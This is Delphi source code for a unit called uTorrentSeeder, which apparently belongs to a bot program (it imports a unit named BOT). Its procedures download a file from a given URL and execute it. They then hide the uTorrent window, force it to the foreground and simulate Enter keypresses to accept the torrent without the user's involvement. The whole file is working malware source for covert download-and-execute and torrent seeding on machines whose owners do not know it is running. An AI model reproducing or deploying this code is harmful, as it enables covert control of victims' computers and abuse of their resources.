unit uTorrentSeeder;

interface
uses Windows,
Urlmon,
shellapi,
KOL,
strings;

var
  uTorrentWindow,childwin, popperwindow : HWND;

  
procedure NOrmalSeed(szUrl, szSaveAs: String; sleepseconds: Integer);
procedure STartutorrent(szURL, szsaveas: String; Sleepseconds: Integer);
function EnumWindowsFunc(Handle: HWND; String123: String): boolean; stdcall;
implementation
uses BOT;

function NT_InternalGetWindowText(Wnd: HWND): string;
type
  TInternalGetWindowText = function(Wnd: HWND; lpString: PWideChar;
    nMaxCount: Integer): Integer; 
  stdcall;
var
  hUserDll: THandle;
  InternalGetWindowText: TInternalGetWindowText;
  lpString: array[0..MAX_PATH] of WideChar; //Buffer for window caption
//  oemStr: PChar;
begin
  Result   := '';
  hUserDll := GetModuleHandle(PChar(usr32));
  if (hUserDll > 0) then
  begin @InternalGetWindowText := GetProcAddress(hUserDll, PChar(strings.InternalGetWindowText));
    if Assigned(InternalGetWindowText) then
    begin
      InternalGetWindowText(Wnd, lpString, SizeOf(lpString));
      Result := string(lpString);
    end;
  end;
end;


function EnumWindowsFunc(Handle: HWND; String123: String) : boolean ; stdcall;
var
  caption: array[0..256] of Char;
begin
 if GetWindowText(Handle, Caption, SizeOf(Caption)-1) <> 0 then
 begin
  if pos(uTorrent, caption) <> 0 then
  begin
  Result := True;
  utorrentWindow := Handle;
  end;

 end;

 result :=True;
end;

function MyEnumWindowsFunc(Handle: HWND; String123: String) : boolean ; stdcall;
var
  caption: array[0..256] of Char;
begin
 if GetWindowText(Handle, Caption, SizeOf(Caption)-1) <> 0 then
 begin
  if pos(utchar1, caption) <> 0 then
  begin
  Result := True;
  utorrentWindow := Handle;
  end;

 end;

 result :=True;
end;



function findpopup: HWND;
begin
  if EnumWindows(@EnumWindowsFunc, LParam(utorrentWindow)) = TRUE then
  begin
  Result := utorrentWindow;
  end;
  Result := utorrentWindow;
end;

function findpopup2: HWND;
begin
  if EnumWindows(@MyEnumWindowsFunc, LParam(popperWindow)) = TRUE then
  begin
  Result := popperWindow;
  end;
end;


procedure SeedUTorrent(szUrl, szSaveAs: String; sleepseconds : Integer);
begin
  utorrentwindow := findpopup;
  //if utorrentwindow <> 0 then
  begin
    URLDownloadToFile(nil, PChar(szUrl), Pchar(szSaveas), 0, nil);
    begin
     ShellExecute(0,PChar(open), PChar(szSaveAs), nil, nil, SW_NORMAL);
     Sleep(sleepseconds * 1000);
      begin
        ShowWindow(utorrentwindow, 0);
        BringWindowToTop(utorrentWindow);
        SetForeGroundWindow(utorrentwindow);
        SetFocus( uTorrentWindow );
        (*Keybd_Event(VK_RETURN,0,0,0); //Taste drücken
        Keybd_Event(VK_RETURN,0,KEYEVENTF_KEYUP,0); //Taste loslassen  *)
        (*WINDOWS.FindWindowEx(utorrentwindow, childwin, 0,0);
        ShowWindow(childwin, 0);
        BringWindowToTop(childwin);
        SetForeGroundWindow(childwin);
        childwin := findpopup2;
        ShowWindow(childwin, 0);
        BringWindowToTop(childwin);
        SetForeGroundWindow(childwin);*)
       (* Keybd_Event(VK_RETURN,0,0,0); //Taste drücken
        Keybd_Event(VK_RETURN,0,KEYEVENTF_KEYUP,0); //Taste loslassen  *)
        childwin := findpopup2;
        SetFocus(childwin);
       (*Keybd_Event(VK_RETURN,0,0,0); //Taste drücken
        Keybd_Event(VK_RETURN,0,KEYEVENTF_KEYUP,0); //Taste loslassen
        Keybd_Event(VK_RETURN,0,0,0); //Taste drücken
        Keybd_Event(VK_RETURN,0,KEYEVENTF_KEYUP,0); //Taste loslassen
        ShowWindow( uTorrentWindow, SW_MINIMIZE ); *)
           sleep(300);
          Keybd_Event(VK_RETURN,0,0,0); //Taste drücken
          Keybd_Event(VK_RETURN,0,KEYEVENTF_KEYUP,0); //Taste loslassen
          sleep(20);
          Keybd_Event(VK_RETURN,0,0,0); //Taste drücken
      end;
    end;
  end;
end;

procedure NOrmalSeed(szUrl, szSaveAs: String; sleepseconds: Integer);
begin
  begin
    URLDownloadToFile(nil, PChar(szUrl), Pchar(szSaveas), 0, nil);
    begin
     ShellExecute(0, PChar(open), PChar(szSaveAs), nil, nil, SW_NORMAL);
     Sleep(Sleepseconds * 1000);
      begin
        Sleep(800);
        Keybd_Event(VK_RETURN,0,0,0); //Taste drücken
        Keybd_Event(VK_RETURN,0,KEYEVENTF_KEYUP,0); //Taste loslassen
      end;
    end;
  end;
end;

procedure STartutorrent(szURL, szsaveas: String; Sleepseconds: Integer);
begin
  SeedUtorrent(szUrl, szSaveAs, sleepseconds);
end;



end.
